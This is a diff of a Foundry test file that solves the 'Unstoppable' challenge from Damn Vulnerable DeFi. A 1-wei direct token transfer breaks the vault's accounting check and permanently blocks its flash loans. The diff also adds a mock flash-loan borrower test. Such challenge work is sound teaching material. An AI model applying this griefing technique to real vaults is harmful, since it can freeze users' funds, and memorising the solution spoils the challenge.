@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
+import {SafeTransferLib, ERC4626, ERC20} from "solmate/tokens/ERC4626.sol";
 
 contract UnstoppableChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -33,7 +35,11 @@ contract UnstoppableChallenge is Test {
         startHoax(deployer);
         // Deploy token and vault
         token = new DamnValuableToken();
-        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
+        vault = new UnstoppableVault({
+            _token: token,
+            _owner: deployer,
+            _feeRecipient: deployer
+        });
 
         // Deposit tokens to vault
         token.approve(address(vault), TOKENS_IN_VAULT);
@@ -92,7 +98,45 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        uint256 vaultBalance = token.balanceOf(address(vault));
+
+        // Transfer a small amount of tokens directly to the vault
+        uint256 amount = 1; // Even 1 wei is enough to cause the imbalance
+        token.transfer(address(vault), amount);
+    }
+
+    function test_flashloan() public {
+        bytes memory data;
+        vm.startPrank(player);
+        // check maxFlashLoan
+        uint256 maxLoan = vault.maxFlashLoan(address(token));
+        uint256 loanAmount = 100e18; //maxLoan > 0 ? maxLoan :
+
+        // Approve the vault to spend tokens on behalf of the player
+        token.approve(address(vault), loanAmount);
+
+        // Create a mock flash loan borrower
+        MockFlashBorrower borrower = new MockFlashBorrower(address(token));
+
+        // Perform the flash loan
+        bool success = vault.flashLoan(
+            IERC3156FlashBorrower(address(borrower)),
+            address(token),
+            loanAmount,
+            data
+        );
+
+        // Assert that the flash loan was successful
+        assertTrue(success, "Flash loan should succeed");
+
+        // Check that the borrowed amount was returned
+        assertEq(
+            token.balanceOf(address(vault)),
+            maxLoan,
+            "Vault balance should remain unchanged after flash loan"
+        );
+
+        vm.stopPrank();
     }
 
     /**
@@ -108,5 +152,28 @@ contract UnstoppableChallenge is Test {
         // And now the monitor paused the vault and transferred ownership to deployer
         assertTrue(vault.paused(), "Vault is not paused");
         assertEq(vault.owner(), deployer, "Vault did not change owner");
+    }
+}
+
+contract MockFlashBorrower is IERC3156FlashBorrower {
+    address public token;
+
+    constructor(address _token) {
+        token = _token;
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address _token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata
+    ) external override returns (bytes32) {
+        require(_token == token, "Unexpected token");
+
+        // Approve the lender to pull the tokens back
+        ERC20(token).approve(msg.sender, amount + fee);
+
+        return keccak256("IERC3156FlashBorrower.onFlashLoan");
     }
 }
